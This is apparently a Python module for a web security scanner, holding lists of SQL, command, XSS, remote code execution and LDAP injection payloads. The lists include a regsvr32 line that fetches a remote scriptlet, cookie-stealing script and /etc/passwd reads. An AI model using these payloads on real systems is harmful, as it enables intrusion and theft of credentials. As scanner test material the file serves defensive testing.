class Injections():
    def sql_injections():
        sql_injections = ['0x200', "' OR 'a'='a", '*/*', "') or \
        (SELECT admin FROM users WHERE admin = true AND ''='",
        "'UNION ALL SELECT username, password FROM members WHERE admin=1--'"]

        return sql_injections

    def command_injections():
        command_injections = ['../../etc/passwd', '; cat /etc/passwd',
            '<!--#exec cmd="ls ../"-->',"|| regsvr32 /s /n /u /\
            i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll, '|ls -la|'"]

        return command_injections

    def xss_injections():
        xss_injections = ["<script>alert('hacked')</script>",
        "<iframe src='http://cnn.com'></iframe>",
        "<script>window.location.href =\
        'https://www.dropbox.com/s/ewbk6o8lttcd4t4/Get%20Started%20with%20Dropbox.pdf?dl=1'\
        </script>", "<script>/* */var i=new Image();/* */i.src=\
        'http://localhost:3000/search?utf8=%E2%9C%93&query='+document.cookie+'\
        &commit=Go'/**/</script>","<<SCRIPT>alert('HackThis!!');//<</SCRIPT>",
        "<a href='evilsite.com'>Click Me!</a>"]

        return xss_injections

    def rce_injections():
        rce_injections = ["http://evilsite.com/evilcode.php", "; system('id')",
        "$(`wget www.google.com`)"]

        return rce_injections

    def ldap_injections():
        ldap_injections = ["*/*","admin*)((|userpassword=*)",
        "page_location=crypts)(rank=*))(&(page_location=crypts",
        "(&(USER = root)(&)","(&(cn=hacker)(cn=*))%00)(userPassword=[pass]))"]

        return ldap_injections

    def dast_scan():
        dast_scan = ['../../etc/passwd', '; cat /etc/passwd',
            '<!--#exec cmd="ls ../"-->',"|| regsvr32 /s /n /u /\
            i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll", "<script>alert\
            ('hacked')</script>", "<iframe src='http://cnn.com'></iframe>",
            "<script>window.location.href =\
            'https://www.dropbox.com/s/ewbk6o8lttcd4t4/Get%20Started%20with%20Dropbox.pdf?dl=1'\
            </script>", "<script>/* */var i=new Image();/* */i.src=\
            'http://localhost:3000/search?utf8=%E2%9C%93&query='+document.cookie+'\
            &commit=Go'/**/</script>","<<SCRIPT>alert('HackThis!!');//<</SCRIPT>",
            '0x200', "' OR 'a'='a", '*/*', "') or \
            (SELECT admin FROM users WHERE admin = true AND ''='",
            "'UNION ALL SELECT username, password FROM members WHERE admin=1--'",
            "*/*","admin*)((|userpassword=*)",
            "page_location=crypts)(rank=*))(&(page_location=crypts",
            "(&(USER = root)(&)","(&(cn=hacker)(cn=*))%00)(userPassword=[pass]))",
            "http://www.attacker_site.com/attack_page", "userinput.txt",
            "/WEB-INF/database/passwordDB"]

        return dast_scan

    def url_snoop():
        url_scan = ['.data', '.php', '.html', '.zip', '.exe', '.rb', '.py',
            '.swf', '.xhtml', '.iso', '.sql', '.avi', '.css', '.doc', '.pdf',
            '.gif', '.png', '.jpg', '.jpeg', '.midi', '.mov', '.mp3', '.tar.gz',
            '.htm']

        return url_scan
